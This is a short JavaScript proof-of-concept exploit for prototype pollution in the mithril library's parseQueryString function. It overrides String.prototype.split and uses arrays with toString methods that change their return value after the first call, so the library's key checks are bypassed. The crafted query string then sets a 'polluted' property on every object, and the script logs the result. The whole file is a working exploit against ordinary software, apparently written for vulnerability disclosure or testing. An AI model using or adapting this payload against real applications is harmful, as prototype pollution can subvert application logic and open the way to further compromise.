var arg1 = ['constructor'];
var arg2 = ['prototype'];
var flag1 = true;
var flag2 = true;
arg1.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return 'constructor';
    }
};
arg2.toString = function () {
    if (flag2) {
        flag2 = false;
        return 'foo';
    } else {
        return 'prototype';
    }
};
String.prototype.split = function () {
    return [
        arg1,
        arg2,
        'polluted'
    ];
};
//require('mithril/test-utils/browserMock')(global);
const m = require('mithril');
obj = {};
console.log({}.polluted);
m.parseQueryString('constructor.prototype%5Bpolluted%5D=yes');
console.log({}.polluted);